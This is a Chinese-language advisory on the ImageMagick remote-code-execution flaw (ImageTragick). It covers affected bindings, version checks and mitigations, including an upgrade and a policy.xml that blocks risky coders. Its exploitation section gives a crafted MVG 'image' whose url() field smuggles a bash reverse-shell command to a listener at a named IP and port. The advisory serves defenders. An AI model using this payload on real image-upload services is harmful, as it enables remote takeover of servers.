---
description: 详细介绍ImageMagick的漏洞危害自测方法、利用方式EXP和修复方案。
---

# ImageMagick安全详解

Feei <feei#feei.cn>

## 0x01 漏洞危害 
ImageMagick是用来处理图片的通用组件，涉及众多语言与平台。 

- PHP(imagick/MagickWand) 
- Python(PythonMagick) 
- Java(JMagick) 
- Nodejs(imagemagick) 
- Ada(G2F) 
- C(MagickCore/MagickWand) 
- Ch(ChMagick) 
- C++(Magick++) 
- Lisp(L-Magick) 
- Neko/haXe(nMagick) 
- Pascal(PascalMagick) 
- Perl(PerlMagick) 
- Ruby(RMagick) 
- Tcl/TK(TclMagick) 

此次漏洞导致的直接危害为**远程代码执行（RCE）** 也就是说，如果你的业务中有用到ImageMagick处理图片，则攻击者只需要上传一个特殊构造的图片即可拿到你服务器的权限。 

## 0x02 检测方式 

**检查是否有使用**
一般ImageMagick用在处理图片的裁剪、压缩以及水印等地方。如果你网站有上传图片的地方，就极有可能用到了。

可以通过关键字搜索： 

PHP代码关键字：```Imagick``` 
Java代码关键字：```MagickImage``` 

#### 通过版本号确认是否存在 

**6.9.3-9**之前的版本都存在该漏洞(**6.9.3-9**版本不完全修复该漏洞)，建议升级至最新的**2016-05-09 7.0.1-3**。 
```bash 
$ convert --version 
Version: ImageMagick 6.8.3-7 2013-07-30 Q16 http://www.imagemagick.org 
Copyright: Copyright (C) 1999-2013 ImageMagick Studio LLC 
Features: DPC OpenMP Delegates: bzlib fontconfig freetype gslib jng jpeg pango png ps tiff x xml zlib 
```

#### 检测脚本 

```bash 
$ git clone https://github.com/ImageTragick/PoCs.git 
$ cd PoCs 
$ ./test.sh 
```

## 0x03 利用方式 

在自己服务器（此处演示为103.21.140.84）上开启监听端口7890 

```bash 
$ nc -vvl 7890 
```

将以下保存为test.jpg，上传到对应图片处理处。 

```bash
push graphic-context 
viewbox 0 0 640 480 
fill 'url(https://example.com/image.jpg"|bash -i >& /dev/tcp/103.21.140.84/7890 0>&1")' 
pop graphic-context 
```

在自己服务器（此处演示为103.21.140.84）上查看是否有反弹SHELL 

## 0x04 修复方式 

**升级ImageMagick至最新的[2016-05-09 7.0.1-3](http://www.imagemagick.org/script/binary-releases.php)版本。** 

如果无法快速升级，先临时做好以下两点： 
1. 处理图片前，先检查图片的magic bytes，也就是图片头，如果图片头不是你想要的格式，那么就不调用ImageMagick处理图片。如果你是php用户，可以使用getimagesize函数来检查图片格式，而如果你是wordpress等web应用的使用者，可以暂时卸载ImageMagick，使用php自带的gd库来处理图片。 

2. 使用policy file来防御这个漏洞，这个文件默认位置在 /etc/ImageMagick/policy.xml ，我们通过配置如下的xml来禁止解析https等敏感操作： 

```xml 
<policymap>  
  <policy domain="coder" rights="none" pattern="EPHEMERAL" />
  <policy domain="coder" rights="none" pattern="URL" />
  <policy domain="coder" rights="none" pattern="HTTPS" />
  <policy domain="coder" rights="none" pattern="MVG" />
  <policy domain="coder" rights="none" pattern="MSL" />
  <policy domain="coder" rights="none" pattern="TEXT" />
  <policy domain="coder" rights="none" pattern="SHOW" />
  <policy domain="coder" rights="none" pattern="WIN" />
  <policy domain="coder" rights="none" pattern="PLT" />
</policymap>
```

**参考**

- [ImageMagick Changelog](http://www.imagemagick.org/script/changelog.php) 
- [ImageTragick](https://imagetragick.com/)
- [PHP Imagick](http://pecl.php.net/package/imagick)

